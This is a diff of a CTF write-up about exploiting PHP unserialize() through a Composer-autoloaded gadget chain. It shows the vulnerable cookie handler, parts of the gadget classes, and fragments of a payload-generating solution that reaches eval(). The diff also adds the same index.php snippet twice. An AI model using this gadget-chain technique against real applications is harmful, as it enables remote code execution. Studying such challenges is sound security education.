@@ -12,10 +12,10 @@ For this challenge, we were provided with source code (dockerize). You also can 
 
 > 🚧 **Description** : Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.
 
-Based on the source code, the challenge is pretty straight forward. On index.php file, it took user input from cookie and passed it to `unserialize()` function. 
+Based on the source code, the challenge is pretty straight forward. On index.php file, it took user input from cookie and passed it to `unserialize()` function.
 
-```php
-// index.php
+{{< highlight php "linenos=true,linenostart=0" >}}
+// File: index.php
 <?php
 require("vendor/autoload.php");
 
@@ -25,11 +25,27 @@ if (isset($_COOKIE['cookie'])) {
 }
 
 echo "Welcome to my web app!";
-```
+
+{{</ highlight >}}
+
+{{< highlight php "linenos=true,linenostart=0" >}}
+// File: index.php
+<?php
+require("vendor/autoload.php");
+
+if (isset($_COOKIE['cookie'])) {
+    $cookie = base64_decode($_COOKIE['cookie']);
+    unserialize($cookie);
+}
+
+echo "Welcome to my web app!";
+
+{{</ highlight >}}
 
 Since the application blindly passed user input to `unserilize()` function, this will lead to deserialize vulnerability. Once we identify the source, now lets find the sink for gadget chain. Based on file provided, there were three additional files which are `GadgetOne/Adders.php`, `GadgetTwo/Echoers.php` and `GadgetThree/Vuln.php`. Based on the file name, ***maybe*** `GadgetThree/Vuln.php` is the sink.
 
-```php
+
+{{< highlight php "linenos=true,linenostart=0" >}}
 // GadgetOne/Adders.php
 <?php
 
@@ -47,8 +63,10 @@ namespace GadgetOne {
         }
     }
 }
-```
-```php
+
+{{</ highlight >}}
+
+{{< highlight php "linenos=true,linenostart=0" >}}
 // GadgetTwo/Echoers.php
 <?php
 
@@ -62,8 +80,10 @@ namespace GadgetTwo {
         }
     }
 }
-```
-```php
+
+{{</ highlight >}}
+
+{{< highlight php "linenos=true,linenostart=0" >}}
 // GadgetThree/Vuln.php
 <?php
 
@@ -89,7 +109,7 @@ namespace GadgetThree {
         }
     }
 }
-```
+{{</ highlight >}}
 
 On `GadgetThree/Vuln.php`, it has a magic method so called `__toString()` and after several if statement, it call `eval()` function. Unlike `__wakeup()` and `__construct()`, which always get executed if the object is created, the `__toString()` method is invoked only when the object is treated as a string. For example, it can decide what to display if the object is passed into an `echo()` or `print()` function. On `GadgetTwo/Echoers`, the class will echo *class* when it destructed. The class must have `get_x()` function from the object, and `get_x()` is exist on `GadgetOne/Adders.php`. Before that, we need to set property of `$klass` is accessable because it was private variable. This can be done using `ReflectionClass`.
 
@@ -101,7 +121,7 @@ Once get the grasp the idea, here is the flow:
 
 ## Solution
 
-```php
+{{< highlight php "linenos=true" >}}
 <?php
 
 namespace GadgetOne {
@@ -109,7 +129,7 @@ namespace GadgetOne {
         private $x;
         function __construct($x) {
             $this->x = $x;
-        } 
+        }
     }
 }
 
@@ -138,9 +158,9 @@ namespace {
     $reflectionProperty->setValue($GadgetTwo, $GadgetOne);
 
     $serialized = base64_encode(serialize($GadgetTwo));
-    echo $serialized."\n";    
+    echo $serialized."\n";
 }
-```
+{{</ highlight >}}
 
 After generating the encoded payload, create cookie named `cookie` using devtools(or any plugin) and set it to our encoded value. You will see the command will be executed after the page refreshed.
 
